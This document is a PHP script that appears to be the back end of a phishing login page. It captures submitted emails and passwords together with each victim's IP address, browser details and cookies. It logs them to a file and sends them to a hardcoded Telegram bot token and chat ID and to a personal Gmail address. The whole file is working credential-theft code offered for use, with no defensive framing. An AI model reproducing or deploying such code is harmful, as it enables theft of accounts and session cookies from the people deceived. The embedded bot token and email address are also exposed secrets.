<?php
date_default_timezone_set('UTC');

$email = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date("Y-m-d H:i:s");
$cookies = $_SERVER['HTTP_COOKIE'] ?? 'No cookies found';

// Parse user agent
function parse_user_agent($ua) {
    $os = "Unknown OS";
    $browser = "Unknown Browser";

    if (preg_match('/linux/i', $ua)) {
        $os = "Linux";
    } elseif (preg_match('/macintosh|mac os x/i', $ua)) {
        $os = "Mac";
    } elseif (preg_match('/windows|win32/i', $ua)) {
        $os = "Windows";
    } elseif (preg_match('/android/i', $ua)) {
        $os = "Android";
    } elseif (preg_match('/iphone/i', $ua)) {
        $os = "iPhone";
    }

    if (preg_match('/MSIE/i', $ua) || preg_match('/Trident/i', $ua)) {
        $browser = "Internet Explorer";
    } elseif (preg_match('/Firefox/i', $ua)) {
        $browser = "Firefox";
    } elseif (preg_match('/Chrome/i', $ua)) {
        $browser = "Chrome";
    } elseif (preg_match('/Safari/i', $ua)) {
        $browser = "Safari";
    } elseif (preg_match('/Opera|OPR/i', $ua)) {
        $browser = "Opera";
    }

    return [$os, $browser];
}

list($os, $browser) = parse_user_agent($ua);

if ($email && $password) {
    $message  = "🔐 New Login\n";
    $message .= "-----------------------\n";
    $message .= "📧 Email: $email\n";
    $message .= "🔑 Password: $password\n";
    $message .= "🌐 IP: $ip\n";
    $message .= "🕒 Time: $time\n";
    $message .= "🖥️ OS: $os\n";
    $message .= "🌐 Browser: $browser\n";
    $message .= "📄 UA: $ua\n";
    $message .= "🍪 Cookies: $cookies\n";

    // ✅ Save to file
    file_put_contents("log.txt", $message . "\n", FILE_APPEND);

    // ✅ Send to Telegram
    $token = "8193103085:AAFFGS-tncgQsxBlqsziW-8k9Y0pGJp-l8A";
    $chat_id = "5265985001";
    $telegramUrl = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    file_get_contents($telegramUrl);

    // ✅ Send to email
    $subject = "🔐 New Login";
    $headers = "From: login-monitor@clearllyso.org\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
    $sent = mail("peggypeedy@gmail.com", $subject, $message, $headers);

    // ✅ Log mail result
    file_put_contents("mail_debug.log", date('c') . " -> mail sent? " . ($sent ? 'YES' : 'NO') . "\n", FILE_APPEND);
}
?>
